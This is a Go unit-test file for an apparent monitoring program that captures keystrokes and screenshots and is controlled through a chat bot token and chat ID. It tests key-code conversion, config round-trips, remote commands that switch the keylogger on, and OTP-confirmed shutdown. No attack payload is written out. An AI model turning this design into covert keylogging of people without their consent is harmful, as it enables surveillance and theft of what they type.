package main

import (
	"path/filepath"
	"testing"
	"time"
)

func setupTemp(t *testing.T) {
	t.Helper()
	dir := t.TempDir()
	baseDir = dir
	configPath = filepath.Join(dir, "config.json")
	logPath = filepath.Join(dir, "monitor.log")
}

func drainQueue() []sendItem {
	var items []sendItem
	for {
		select {
		case it := <-sendQ:
			items = append(items, it)
		default:
			return items
		}
	}
}

func TestParseBool(t *testing.T) {
	for _, s := range []string{"1", "on", "true", "YES", "bật", "bat", "có"} {
		if !parseBool(s) {
			t.Errorf("parseBool(%q) should be true", s)
		}
	}
	for _, s := range []string{"0", "off", "false", "khong", "", "no"} {
		if parseBool(s) {
			t.Errorf("parseBool(%q) should be false", s)
		}
	}
}

func TestIsDigits(t *testing.T) {
	if !isDigits("123") || isDigits("12a") || isDigits("") {
		t.Error("isDigits wrong")
	}
}

func TestVkToText(t *testing.T) {
	cases := []struct {
		vk    int
		shift bool
		want  string
	}{
		{0x41, false, "a"}, {0x41, true, "A"},
		{0x0D, false, "[ENTER]"}, {0x31, true, "!"},
		{0x31, false, "1"}, {0x20, false, " "},
	}
	for _, c := range cases {
		if got := vkToText(c.vk, c.shift); got != c.want {
			t.Errorf("vkToText(%#x,%v)=%q want %q", c.vk, c.shift, got, c.want)
		}
	}
}

func TestConfigRoundtrip(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) {
		c.ScreenshotInterval = 90
		c.BotToken = "123:ABC"
		c.ChatID = "999"
	})
	cfg = defaultConfig()
	loadConfig()
	if cfgGet().ScreenshotInterval != 90 || cfgGet().BotToken != "123:ABC" || cfgGet().ChatID != "999" {
		t.Fatalf("config roundtrip failed: %+v", cfgGet())
	}
}

func TestApplySet(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	if !applySet("screenshot_interval", "42") || cfgGet().ScreenshotInterval != 42 {
		t.Fatal("set interval failed")
	}
	if !applySet("keylogger", "on") || !cfgGet().Keylogger {
		t.Fatal("set keylogger failed")
	}
	if applySet("bad_key", "x") {
		t.Fatal("bad key should fail")
	}
}

func TestCommands(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ChatID = "123" })
	drainQueue()

	handleCommand("/interval 60", "123")
	if cfgGet().ScreenshotInterval != 60 {
		t.Fatal("interval cmd failed")
	}
	handleCommand("/screen off", "123")
	if cfgGet().ScreenshotsEnabled {
		t.Fatal("screen off failed")
	}
	handleCommand("/set keylogger on", "123")
	if !cfgGet().Keylogger {
		t.Fatal("set keylog failed")
	}
	items := drainQueue()
	if len(items) == 0 {
		t.Fatal("expected reply messages queued")
	}
}

func TestOtpFlow(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ChatID = "123" })
	pending = map[string]pendingOtp{}
	drainQueue()

	requestOtp("stop", "TEST")
	if _, ok := pending["stop"]; !ok {
		t.Fatal("otp not created")
	}
	code := pending["stop"].code

	// wrong code -> still pending
	handleCommand("/confirm 000000x", "123")
	if _, ok := pending["stop"]; !ok {
		t.Fatal("wrong code should keep pending")
	}
	// expired -> removed
	pending["stop"] = pendingOtp{code: code, expires: time.Now().Add(-time.Second)}
	handleCommand("/confirm "+code, "123")
	if _, ok := pending["stop"]; ok {
		t.Fatal("expired otp should be cleared")
	}

	// correct -> executes (use a safe action to avoid os.Exit: test cancel path)
	requestOtp("shutdown", "X")
	code2 := pending["shutdown"].code
	// verify confirm matches & removes (executeAction shutdown calls stub shutdownMachine)
	handleCommand("/confirm "+code2, "123")
	if _, ok := pending["shutdown"]; ok {
		t.Fatal("confirm should consume otp")
	}
}

func TestMaskToken(t *testing.T) {
	if maskToken("123456789:ABC") == "123456789:ABC" {
		t.Fatal("token should be masked")
	}
}
